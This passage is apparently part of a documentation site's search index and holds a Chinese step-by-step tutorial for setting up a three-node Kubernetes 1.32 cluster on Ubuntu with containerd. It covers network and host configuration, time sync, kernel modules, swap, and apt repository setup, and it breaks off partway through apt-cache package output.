\u200b\u67e5\u770b\u200bssh\u200b\u72b6\u6001\u200b \n</code></pre>"},{"location":"3/2/#13","title":"1.3 \u200b\u96c6\u7fa4\u200b\u4e3b\u673a\u200b\u914d\u7f6e","text":""},{"location":"3/2/#131","title":"1.3.1 \u200b\u4e3b\u673a\u540d\u200b\u914d\u7f6e","text":"<p>\u200b\u7531\u4e8e\u200b\u672c\u6b21\u200b\u4f7f\u7528\u200b3\u200b\u53f0\u200b\u4e3b\u673a\u200b\u5b8c\u6210\u200bkubernetes\u200b\u96c6\u7fa4\u200b\u90e8\u7f72\u200b\uff0c\u200b\u5176\u4e2d\u200b1\u200b\u53f0\u4e3a\u200bmaster\u200b\u8282\u70b9\u200b,\u200b\u540d\u79f0\u200b\u4e3a\u200bk8s-master01;\u200b\u5176\u4e2d\u200b2\u200b\u53f0\u4e3a\u200bworker\u200b\u8282\u70b9\u200b\uff0c\u200b\u540d\u79f0\u200b\u5206\u522b\u200b\u4e3a\u200b\uff1ak8s-worker01\u200b\u53ca\u200bk8s-worker02</p> <p>master01\u200b\u8282\u70b9\u200b</p> Bash<pre><code>~# hostnamectl set-hostname k8s-master01\n</code></pre> <p>worker01\u200b\u8282\u70b9\u200b</p> Bash<pre><code>~# hostnamectl set-hostname k8s-worker01\n</code></pre> <p>worker02\u200b\u8282\u70b9\u200b</p> Bash<pre><code>~# hostnamectl set-hostname k8s-worker02\n</code></pre>"},{"location":"3/2/#132-ip","title":"1.3.2 \u200b\u4e3b\u673a\u200bIP\u200b\u5730\u5740\u200b\u914d\u7f6e","text":"<p>k8s-master01\u200b\u8282\u70b9\u200bIP\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1a192.168.11.161/24</p> Bash<pre><code> root@k8s-master01:~# nano /etc/netplan/50-cloud-init.yaml\n root@k8s-master01:~# cat /etc/netplan/50-cloud-init.yaml\n</code></pre> <p>50-cloud-init.yaml\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u6216\u200b\u4fee\u6539\u200bIP\u200b\u5730\u5740\u200b\uff08\u200b\u6ce8\u610f\u200b\u7f51\u5361\u200b\u540d\u79f0\u200b\u9700\u8981\u200b\u4e0e\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u4ee5\u592a\u7f51\u5361\u200b\u4e00\u81f4\u200b\uff09</p> YAML<pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens18:\n      dhcp4: no\n      addresses:\n        - 192.168.11.161/24\n      routes:\n        - to: default\n          via: 192.168.11.1\n      nameservers:\n        addresses: [119.29.29.29,114.114.114.114,8.8.8.8]\n</code></pre> <p>\u200b\u4fdd\u5b58\u200bk8s-master01\u200b\u7684\u200b\u7f51\u5361\u200b\u914d\u7f6e\u200b</p> Bash<pre><code>root@k8s-master01:~# sudo netplan apply\n</code></pre> <p>\u200b\u91cd\u65b0\u200b\u6309\u65b0\u200bip\u200b\u8fde\u63a5\u200b\u4e3b\u673a\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u540d\u200b\u67e5\u770b\u200bip\u200b\u5730\u5740\u200b\u4fe1\u606f\u200b</p> Bash<pre><code>ip a s\n</code></pre> <p>k8s-worker01\u200b\u8282\u70b9\u200bIP\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1a192.168.11.165/24</p> Bash<pre><code>root@k8s-worker01:~# nano /etc/netplan/50-cloud-init.yaml\nroot@k8s-worker01:~# cat /etc/netplan/50-cloud-init.yaml\n</code></pre> YAML<pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    enp6s18:\n      dhcp4: no\n      addresses:\n        - 192.168.11.165/24\n      routes:\n        - to: default\n          via: 192.168.11.1\n      nameservers:\n        addresses: [119.29.29.29,114.114.114.114,8.8.8.8]\n</code></pre> <p>\u200b\u4fdd\u5b58\u200bk8s-worker01\u200b\u7684\u200b\u7f51\u5361\u200b\u914d\u7f6e\u200b</p> Bash<pre><code>root@k8s-worker01:~# sudo netplan apply\n</code></pre> <p>k8s-worker02\u200b\u8282\u70b9\u200bIP\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1a192.168.11.166/24</p> Bash<pre><code>root@k8s-worker02:~# nano /etc/netplan/50-cloud-init.yaml\nroot@k8s-worker02:~# cat /etc/netplan/50-cloud-init.yaml\n</code></pre> YAML<pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    enp6s18:\n      dhcp4: no\n      addresses:\n        - 192.168.11.166/24\n      routes:\n        - to: default\n          via: 192.168.11.1\n      nameservers:\n        addresses: [119.29.29.29,114.114.114.114,8.8.8.8]\n</code></pre> <p>\u200b\u4fdd\u5b58\u200bk8s-worker02\u200b\u7684\u200b\u7f51\u5361\u200b\u914d\u7f6e\u200b</p> Bash<pre><code>root@k8s-worker02:~# sudo netplan apply\n</code></pre>"},{"location":"3/2/#133-ip","title":"1.3.3 \u200b\u4e3b\u673a\u540d\u200b\u4e0e\u200bIP\u200b\u5730\u5740\u200b\u89e3\u6790","text":"<p>\u200b\u6240\u6709\u200b\u96c6\u7fa4\u200b\u4e3b\u673a\u200b\u5747\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5728\u200b\u6ca1\u6709\u200bDNS\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u73af\u5883\u200b\u4e2d\u200b\u9700\u8981\u200b\u5148\u80fd\u200b\u89e3\u6790\u200b\u5230\u200b\u5404\u4e2a\u200b\u8282\u70b9\u200b\u7684\u200bIP\u200b\u5730\u5740\u200b</p> Bash<pre><code>~# sudo nano /etc/hosts\n</code></pre> <ul> <li>\u200b\u5728\u200b\u6587\u4ef6\u200b\u540e\u9762\u200b\u8ffd\u52a0\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b</li> </ul> Bash<pre><code>192.168.11.161 k8s-master01\n192.168.11.165 k8s-worker01\n192.168.11.166 k8s-worker02\n</code></pre> <p>\u200b\u4fee\u6539\u200b\u540e\u200bCtrl+O,\u200b\u7136\u540e\u200bEnter\u200b\u952e\u200b\uff0c\u200b\u518d\u200bCtrl+X\u200b\u4fdd\u5b58\u200b\u6587\u4ef6\u200b\u4fee\u6539\u200b\u5e76\u200b\u9000\u51fa\u200b</p> <p>\u200b\u67e5\u770b\u200bIP\u200b\u89e3\u6790\u200b\u914d\u7f6e\u200b\u662f\u5426\u200b\u751f\u6548\u200b\u547d\u4ee4\u200b</p> Bash<pre><code>~$ ping -c 4 k8s-master01\n~$ ping -c 4 k8s-worker01\n~$ ping -c 4 k8s-worker02\n</code></pre>"},{"location":"3/2/#134","title":"1.3.4 \u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u914d\u7f6e","text":"<p>\u200b\u67e5\u770b\u200b\u65f6\u95f4\u200b</p> Bash<pre><code>~# date\n Thu Sep  7 05:39:21 AM UTC 2024\n</code></pre> <p>\u200b\u66f4\u6362\u200b\u65f6\u200b\u533a\u200b</p> Bash<pre><code>~# timedatectl set-timezone Asia/Shanghai\n</code></pre> <p>\u200b\u518d\u6b21\u200b\u67e5\u770b\u200b\u65f6\u95f4\u200b Bash<pre><code>~# date\n Thu Sep  7 01:39:51 PM CST 2024\n</code></pre></p> <p>\u200b\u5b89\u88c5\u200bntpdate\u200b\u547d\u4ee4\u200b</p> Bash<pre><code>~# apt install ntpdate -y\n</code></pre> <p>\u200b\u4f7f\u7528\u200bntpdate\u200b\u547d\u4ee4\u200b\u540c\u6b65\u200b\u65f6\u95f4\u200b</p> Bash<pre><code>~# ntpdate time1.aliyun.com\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u8ba1\u5212\u200b\u4efb\u52a1\u200b\u5b9e\u73b0\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b</p> Bash<pre><code>~# apt install cron -y\n~# crontab -e\n no crontab for root - using an empty one\n Select an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        &lt;---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n Choose 1-4 [1]: 2\n ......\n0 */1 * * * ntpdate time1.aliyun.com           // \u200b\u5199\u5165\u200b\u914d\u7f6e\u6587\u4ef6\u200b\n~# crontab -l   // \u200b\u67e5\u770b\u200bcrontab\u200b\u914d\u7f6e\u200b\n ......\n0 */1 * * * ntpdate time1.aliyun.com        \n</code></pre>"},{"location":"3/2/#135","title":"1.3.5 \u200b\u914d\u7f6e\u200b\u5185\u6838\u200b\u8f6c\u53d1\u200b\u53ca\u200b\u7f51\u6865\u200b\u8fc7\u6ee4","text":"<p>\u200b\u6240\u6709\u200b\u4e3b\u673a\u200b\u5747\u200b\u9700\u8981\u200b\u64cd\u4f5c\u200b\u3002</p> <p>Way1\uff1a\u200b\u624b\u52a8\u200b\u6267\u884c\u200b\uff0c\u200b\u624b\u52a8\u200b\u52a0\u8f7d\u200b\u5185\u6838\u200b\u8f6c\u53d1\u200b\u53ca\u200b\u7f51\u6865\u200b\u8fc7\u6ee4\u200b\u6a21\u5757\u200b</p> Bash<pre><code>~# modprobe overlay\n~# modprobe br_netfilter\n</code></pre> <p>Way2\uff1a\u200b\u521b\u5efa\u200b\u52a0\u8f7d\u200b\u5185\u6838\u6a21\u5757\u200b\u6587\u4ef6\u200b</p> Bash<pre><code>~# sudo cat &lt;&lt; EOF | tee /etc/modules-load.d/k8s.conf\noverlay\nbr_netfilter\nEOF\n</code></pre> <ul> <li>\u200b\u67e5\u770b\u200b\u5df2\u200b\u52a0\u8f7d\u200b\u7684\u200b\u6a21\u5757\u200b</li> </ul> Bash<pre><code>~# lsmod | egrep \"overlay\"\noverlay               151552  0\n</code></pre> Bash<pre><code>~# lsmod | egrep \"br_netfilter\"\nbr_netfilter    32768   0       \nbridge           307200  1 br_netfilter\n</code></pre> <ul> <li>\u200b\u6dfb\u52a0\u200b\u7f51\u6865\u200b\u8fc7\u6ee4\u200b\u53ca\u200b\u5185\u6838\u200b\u8f6c\u53d1\u200b\u914d\u7f6e\u6587\u4ef6\u200b</li> </ul> Bash<pre><code>~# cat &lt;&lt; EOF| tee /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\nEOF\n</code></pre> <p>\u200b\u67e5\u770b\u200b\u914d\u7f6e\u6587\u4ef6\u200b</p> Bash<pre><code>~# nano /etc/modules-load.d/k8s.conf\n~# cat /etc/modules-load.d/k8s.conf\n</code></pre> <p>\u200b\u52a0\u8f7d\u200b\u5185\u6838\u200b\u53c2\u6570\u200b,\u200b\u4f7f\u200b\u4e4b\u200b\u751f\u6548\u200b</p> Bash<pre><code>~# sysctl --system\n</code></pre> <p>\u200b\u68c0\u67e5\u200b\u8f93\u51fa\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e2d\u200b\u662f\u5426\u200b\u5305\u542b\u200b\u4ee5\u4e0b\u200b\u4e09\u9879\u200b\uff1a</p> Text Only<pre><code>net.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\n</code></pre>"},{"location":"3/2/#136-ipsetipvsadm","title":"1.3.6 \u200b\u5b89\u88c5\u200bipset\u200b\u53ca\u200bipvsadm","text":"<p>\u200b\u6240\u6709\u200b\u4e3b\u673a\u200b\u5747\u200b\u9700\u8981\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u5b89\u88c5\u200bipset\u200b\u53ca\u200bipvsadm\u200b\u547d\u4ee4\u200b</p> Bash<pre><code> ~# apt install ipset ipvsadm -y\n</code></pre> <p>\u200b\u914d\u7f6e\u200bipvsadm\u200b\u6a21\u5757\u200b\u52a0\u8f7d\u200b</p> <p>\u200b\u6dfb\u52a0\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u9700\u8981\u200b\u52a0\u8f7d\u200b\u7684\u200b\u6a21\u5757\u200b\u6587\u4ef6\u200b</p> Bash<pre><code>~# cat &lt;&lt; EOF | tee /etc/modules-load.d/ipvs.conf\nip_vs\nip_vs_rr\nip_vs_wrr\nip_vs_sh\nnf_conntrack\nEOF\n</code></pre> <p>\u200b\u521b\u5efa\u200b\u52a0\u8f7d\u200b\u6a21\u5757\u200b\u811a\u672c\u200b\u6587\u4ef6\u200b</p> Bash<pre><code>~# cat &lt;&lt; EOF | tee ipvs.sh\n#!/bin/sh\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack\nEOF\n</code></pre> <p>\u200b\u4e0a\u8ff0\u200b\u547d\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u5f53\u524d\u76ee\u5f55\u200b\u4e0b\u4f1a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200bipvs.sh\u200b\u811a\u672c\u200b\u6587\u4ef6\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u4f7f\u7528\u200bbash\u200b\u547d\u4ee4\u200b\u6267\u884c\u200b\u5b83\u200b</p> <p>\u200b\u6267\u884c\u200bipvs.sh\u200b\u811a\u672c\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4ee5\u200b\u52a0\u8f7d\u200b\u6a21\u5757\u200b</p> Bash<pre><code>~# sh ipvs.sh\n</code></pre> <p>\u200b\u67e5\u770b\u200bipvs\u200b\u914d\u7f6e\u200b\u662f\u5426\u200b\u5df2\u200b\u751f\u6548\u200b</p> Bash<pre><code>root@k8s-master01:~# lsmod | grep ip_vs\nip_vs_sh               12288  0\nip_vs_wrr              12288  0\nip_vs_rr               12288  0\nip_vs                 221184  6 ip_vs_rr,ip_vs_sh,ip_vs_wrr\nnf_conntrack          196608  1 ip_vs\nnf_defrag_ipv6         24576  2 nf_conntrack,ip_vs\nlibcrc32c              12288  4 nf_conntrack,btrfs,raid456,ip_vs\n</code></pre>"},{"location":"3/2/#137-swap","title":"1.3.7 \u200b\u5173\u95ed\u200bSWAP\u200b\u5206\u533a","text":"<p>\u200b\u4fee\u6539\u200b\u5b8c\u6210\u200b\u540e\u200b\u9700\u8981\u200b\u91cd\u542f\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\uff0c</p> <p>Way1\uff1a\u200b\u4e34\u65f6\u200b\u5173\u95ed\u200b\uff08\u200b\u4e0d\u200b\u63a8\u8350\u200b\uff09\uff0c\u200b\u82e5\u200b\u4e0d\u200b\u91cd\u542f\u200b\uff0c\u200b\u547d\u4ee4\u200b\u4e3a\u200b</p> Bash<pre><code>~# swapoff -a\n</code></pre> <p>Way2\uff1a\u200b\u6c38\u4e45\u200b\u5173\u95ed\u200bswap\u200b\u5206\u533a\u200b\uff08\u200b\u63a8\u8350\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u91cd\u542f\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\uff09</p> Bash<pre><code>~# nano /etc/fstab    // \u200b\u8fdb\u5165\u200b\u5206\u533a\u200b\u914d\u7f6e\u6587\u4ef6\u200b\n ......\n\n #/swap.img   none    swap   sw      0       0    // \u200b\u5728\u200b\u6b64\u884c\u200b\u9996\u200b\u6dfb\u52a0\u200b\u201c#\u201d\u200b\u4ee5\u200b\u6ce8\u91ca\u200bswap\u200b\u5206\u533a\u200b\u7684\u200b\u914d\u7f6e\u200b\n</code></pre> <p>\u200b\u4fee\u6539\u200b\u5b8c\u6210\u200b\u540e\u200b\u4fdd\u5b58\u200b\u6587\u4ef6\u200b\u5e76\u200b\u9000\u51fa\u200b</p>"},{"location":"3/2/#k8s-containerd","title":"\u4e8c\u200b\u3001K8S\u200b\u96c6\u7fa4\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b Containerd \u200b\u51c6\u5907","text":"<ul> <li> <p>\u200b\u5b89\u88c5\u200bdocker-ce\u200b\u65b9\u6cd5\u200b\uff1ahttps://docs.docker.com/engine/install/ubuntu/</p> </li> <li> <p>\u200b\u672c\u6587\u200b\u5b9e\u9645\u200b\u91c7\u7528\u200bcontainerd\u200b\u4f5c\u4e3a\u200b\u96c6\u7fa4\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u7684\u200b\u8fd0\u884c\u200b\u5e73\u53f0\u200b</p> </li> </ul>"},{"location":"3/2/#21-containerd","title":"2.1 Containerd\u200b\u90e8\u7f72\u200b\u6587\u4ef6\u200b\u83b7\u53d6","text":"<p>wget\u200b\u4e0b\u8f7d\u200b1.7.27\u200b\u7248\u672c\u200bcontainerd</p> Bash<pre><code>~# wget https://github.com/containerd/containerd/releases/download/v1.7.27/cri-containerd-1.7.27-linux-amd64.tar.gz\n</code></pre> <p>\u200b\u89e3\u538b\u200b\u5b89\u88c5\u200b</p> Bash<pre><code>~# sudo apt install debianutils\n~# sudo apt install --reinstall libc6\n~# sudo apt install --reinstall which\n\n\n~# sudo tar xf /home/acanx/cri-containerd-1.7.27-linux-amd64.tar.gz  -C /\n\n~# which containerd\n\n/usr/local/bin/containerd\n~# which runc\n\n/usr/local/sbin/runc\n</code></pre> <p>\u200b\u9a8c\u8bc1\u200bcontainerd\u3001runc\u200b\u662f\u5426\u200b\u5b89\u88c5\u200b\u6210\u529f\u200b</p> Bash<pre><code>~# which containerd\n~# which runc\n~# whereis containerd\n</code></pre>"},{"location":"3/2/#22-containerd","title":"2.2 Containerd\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u751f\u6210\u200b\u5e76\u200b\u4fee\u6539","text":"<p>\u200b\u521b\u5efa\u200bcontainerd\u200b\u914d\u7f6e\u200b\u6587\u4ef6\u76ee\u5f55\u200b/etc/containerd</p> Bash<pre><code>~# mkdir /etc/containerd\n~# sudo chmod -R 777 /etc/containerd/       // \u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u4e0a\u4f20\u200b\u914d\u7f6e\u6587\u4ef6\u200b\n</code></pre> <p>\u200b\u751f\u6210\u200b\u914d\u7f6e\u6587\u4ef6\u200bconfig.toml\u200b\u53ca\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b</p> Bash<pre><code>~# containerd config default &gt; /etc/containerd/config.toml\n</code></pre> <p>\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u7b2c\u200b67\u200b\u884c\u200b</p> Bash<pre><code>~# nano /etc/containerd/config.toml\n</code></pre> Text Only<pre><code> sandbox_image = \"registry.k8s.io/pause:3.10\"  // \u200b\u7531\u200b3.9\u200b\u4fee\u6539\u200b\u4e3a\u200b3.10\n</code></pre> <ul> <li>\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u4e3a\u200b\uff1a</li> </ul> Text Only<pre><code>sandbox_image = \"registry.aliyuncs.com/google_containers/pause:3.9\"  // \u200b\u7531\u200b3.9\u200b\u4fee\u6539\u200b\u4e3a\u200b3.10\n</code></pre> <p>\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u7b2c\u200b139\u200b\u884c\u200b</p> Bash<pre><code>~# vim /etc/containerd/config.toml\n SystemdCgroup = true \u200b\u7531\u200bfalse\u200b\u4fee\u6539\u200b\u4e3a\u200btrue\n</code></pre>"},{"location":"3/2/#23-containerd","title":"2.3 Containerd\u200b\u542f\u52a8\u200b\u53ca\u200b\u5f00\u673a\u200b\u81ea\u542f\u52a8","text":"<p>\u200b\u8bbe\u7f6e\u200bcontainerd\u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\u5e76\u200b\u7acb\u5373\u200b\u542f\u52a8\u200b</p> Bash<pre><code>~# sudo tee /etc/systemd/system/containerd.service &lt;&lt;EOF\n[Unit]\nDescription=containerd container runtime\nDocumentation=https://containerd.io\nAfter=network.target local-fs.target\n\n[Service]\nExecStartPre=-/sbin/modprobe overlay\nExecStart=/usr/local/bin/containerd\n\nType=notify\nDelegate=yes\nKillMode=process\nRestart=always\nRestartSec=5\n\n# \u200b\u9650\u5236\u200b\u65e5\u5fd7\u200b\u5927\u5c0f\u200b\nLimitNOFILE=infinity\n\n[Install]\nWantedBy=multi-user.target\nEOF\n</code></pre> Bash<pre><code>~# ls /etc/systemd/system/containerd.service\n~# systemctl enable --now containerd\n</code></pre> <p>\u200b\u9a8c\u8bc1\u200bcontainerd\u200b\u7248\u672c\u200b</p> Bash<pre><code>~# containerd --version\n</code></pre>"},{"location":"3/2/#k8s","title":"\u4e09\u200b\u3001K8S\u200b\u96c6\u7fa4\u200b\u90e8\u7f72","text":""},{"location":"3/2/#31-k8sapt","title":"3.1 K8S\u200b\u96c6\u7fa4\u200b\u8f6f\u4ef6\u200bapt\u200b\u6e90\u200b\u51c6\u5907","text":"<p>\u200b\u672c\u6b21\u200b\u4f7f\u7528\u200bkubernetes\u200b\u793e\u533a\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4ed3\u5e93\u200b\u6216\u200b\u963f\u91cc\u200b\u4e91\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u5efa\u8bae\u200b\u7f51\u7edc\u200b\u4e0d\u200b\u7545\u901a\u200b\u7684\u200b\u9009\u62e9\u200b\u963f\u91cc\u200b\u4e91\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4ed3\u5e93\u200b</p> <p>\u200b\u4e0b\u8f7d\u200b\u7528\u4e8e\u200b Kubernetes \u200b\u8f6f\u4ef6\u5305\u200b\u4ed3\u5e93\u200b\u7684\u200b\u516c\u5171\u200b\u7b7e\u540d\u200b\u5bc6\u94a5\u200b,\u200b\u6240\u6709\u200b\u4ed3\u5e93\u200b\u90fd\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u7b7e\u540d\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u200bURL\u200b\u4e2d\u200b\u7684\u200b\u7248\u672c\u200b\uff1a</p> <ul> <li>K8S\u200b\u793e\u533a\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4ed3\u5e93\u200b\u7b7e\u540d\u6587\u4ef6\u200b\u4e0b\u8f7d\u200b</li> </ul> Bash<pre><code>~# curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.32/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n~# ls /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n</code></pre> <ul> <li>\u200b\u963f\u91cc\u200b\u4e91\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4ed3\u5e93\u200b\u7b7e\u540d\u6587\u4ef6\u200b\u4e0b\u8f7d\u200b</li> </ul> Bash<pre><code>~# curl -fsSL https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb/Release.key | gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n</code></pre>"},{"location":"3/2/#kubernetes-apt","title":"\u6dfb\u52a0\u200b Kubernetes apt \u200b\u4ed3\u5e93","text":"<p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u6b64\u200b\u4ed3\u5e93\u200b\u4ec5\u200b\u5305\u542b\u200b\u9002\u7528\u200b\u4e8e\u200b Kubernetes 1.32.3 \u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\uff1b \u200b\u5bf9\u4e8e\u200b\u5176\u4ed6\u200b Kubernetes \u200b\u6b21\u8981\u200b\u7248\u672c\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u66f4\u6539\u200b URL \u200b\u4e2d\u200b\u7684\u200b Kubernetes \u200b\u6b21\u8981\u200b\u7248\u672c\u200b\u4ee5\u200b\u5339\u914d\u200b\u4f60\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u6b21\u8981\u200b\u7248\u672c\u200b \u3002</p> <p>\u200b\u6b64\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u8986\u76d6\u200b /etc/apt/sources.list.d/kubernetes.list \u200b\u4e2d\u200b\u73b0\u5b58\u200b\u7684\u200b\u6240\u6709\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u3002</p>"},{"location":"3/2/#k8s_1","title":"K8S\u200b\u793e\u533a","text":"Bash<pre><code>~# echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.32/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list\n</code></pre>"},{"location":"3/2/#_2","title":"\u963f\u91cc\u200b\u4e91","text":"Bash<pre><code>~# echo \"deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb/ /\" | tee /etc/apt/sources.list.d/kubernetes.list\n</code></pre> <p>\u200b\u66f4\u65b0\u200b apt \u200b\u5305\u200b\u7d22\u5f15\u200b</p> Bash<pre><code>~# sudo apt-get update\n</code></pre>"},{"location":"3/2/#32-k8skubelet","title":"3.2 K8S\u200b\u96c6\u7fa4\u200b\u8f6f\u4ef6\u200b\u5b89\u88c5\u200b\u53ca\u200bkubelet\u200b\u914d\u7f6e","text":"<p>\u200b\u6240\u6709\u200b\u8282\u70b9\u5747\u200b\u53ef\u200b\u5b89\u88c5\u200b</p>"},{"location":"3/2/#321-k8s","title":"3.2.1 k8s\u200b\u96c6\u7fa4\u200b\u8f6f\u4ef6\u200b\u5b89\u88c5","text":"<p>\u200b\u67e5\u770b\u200b\u8f6f\u4ef6\u200b\u5217\u8868\u200b</p> Bash<pre><code>root@k8s-master01:~# apt-cache policy kubeadm\n\nkubeadm:\n  Installed: (none)\n  Candidate: 1.32.3-1.1\n  Version table:\n     1.32.3-1.1 500\n        500 https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n     1.32.2-1.1 500\n        500 https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n     1.32.1-1.1 500\n        500 https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n     1.32.0-1.1 500\n        500 https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n</code></pre> <p>\u200b\u67e5\u770b\u200b\u8f6f\u4ef6\u200b\u5217\u8868\u200b\u53ca\u5176\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b</p> Bash<pre><code>root@k8s-master01:~# apt-cache showpkg kubeadm\n\nPackage: kubeadm\nVersions: \n1.32.3-1.1 (/var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages)\n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n\n1.32.2-1.1 (/var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages)\n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: 